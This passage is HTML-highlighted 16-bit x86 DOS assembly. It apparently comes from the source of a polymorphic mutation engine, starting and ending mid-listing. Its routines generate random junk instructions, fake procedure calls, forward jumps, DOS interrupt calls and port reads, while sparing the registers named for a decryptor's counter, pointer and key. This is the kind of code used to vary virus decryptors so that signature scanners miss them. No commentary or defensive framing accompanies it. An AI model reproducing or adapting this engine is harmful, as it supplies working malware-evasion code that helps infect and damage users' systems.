    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; Patch call procedure</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Cnum</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CallsNum</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">CallsGone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PutCall</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Put call to procedure</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CallsNum</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CallsGone</span><span class="sc0">                </span><span class="sc1">;( No procedures created !</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRnd</span><span class="sc0">             </span><span class="sc1">; Get random procedure</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CCalls</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">             </span><span class="sc1">; Encode Call</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; Patch offset</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MakeInt</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; Make Int</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">UseInt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoInts</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Creg</span><span class="sc0">               </span><span class="sc1">; Ax used ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoInts</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">iTbls</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">             </span><span class="sc1">; Get random int func. from</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">iTbl</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc0">             </span><span class="sc1">; encode mov ah,FuncNum</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc0">             </span><span class="sc1">; encode int FuncInt</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">NoInts</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">iTbl</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">; Function,Int</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc5">iTbls</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">iTbl</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FCall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CNum</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; Create forward call</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoMake</span><span class="sc0">              </span><span class="sc1">; We're inside procedure ?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get number of forward</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">FCalln</span><span class="sc0">               </span><span class="sc1">; call offsets</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NoMake</span><span class="sc0">          </span><span class="sc1">; More then aviable table space ?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallpt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; We're creating another</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoMake</span><span class="sc0">              </span><span class="sc1">; forward procedure ?</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">FCallT</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Nope... Lets point to</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; free part of table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">             </span><span class="sc1">; Encode Call </span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Store offset for later</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; pach</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Increase number of fwrd .calls</span><span class="sc0">

</span><span class="sc5">NoMake</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">PFCall</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Patch forward call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; If there any waiting</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; to be patched ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoMake2</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallpt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; We're patching now ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoMake2</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallpt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Lets patch</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">             </span><span class="sc1">; Encode Jmp near</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GG</span><span class="sc0">                 </span><span class="sc1">; One byte garble</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MGarb</span><span class="sc0">              </span><span class="sc1">; Make garbage</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">             </span><span class="sc1">; Encode ret</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GG</span><span class="sc0">                 </span><span class="sc1">; Garble</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallP</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallT</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Patch Call</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; Patch jmp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallp</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallpt</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NoMake2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MakeRol</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetRnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MakeRol</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">ChooseReg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D1h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MakeIn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CReg</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SkipIn</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">InTblL</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">GetRnd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">][</span><span class="sc5">InTbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">SkipIn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InTbl</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; Interrupt controller</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; Timer 1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">41h</span><span class="sc0">         </span><span class="sc1">; Timer 2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; DMA 0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; DMA 0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; DMA 1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; DMA 1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">; DMA 2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">; DMA 2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc0">         </span><span class="sc1">; DMA 3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07h</span><span class="sc0">         </span><span class="sc1">; DMA 3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0">         </span><span class="sc1">; Get char</span><span class="sc0">
</span><span class="sc5">InTbll</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">InTbl</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FinishJob</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">                </span><span class="sc1">; Check if there any</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FCallP</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; unfinished forward</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                </span><span class="sc1">; calls ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoFinish</span><span class="sc0">
</span><span class="sc5">LMakez</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PFCall</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LMakez</span><span class="sc0">
</span><span class="sc5">NoFinish</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FinishJob</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CReg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Reg used ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CregDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Pointer</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CregDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">KeyWord</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CregDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ResV</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CregDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ResV2</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CregDone</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CRegDone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Creg</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckBp</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">CheckBp1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MakePr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckBp1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">CheckBp2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MakePr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckBp2</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">0C0h</span><span class="sc4">-</span><span class="sc2">40h</span><span class="sc4">)/</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc0">
</span><span class="sc5">CheckBp3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MakePr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckBp3</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoPrefix</span><span class="sc0">

</span><span class="sc5">MakePr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Getrnd</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MakeEs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MakeEs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
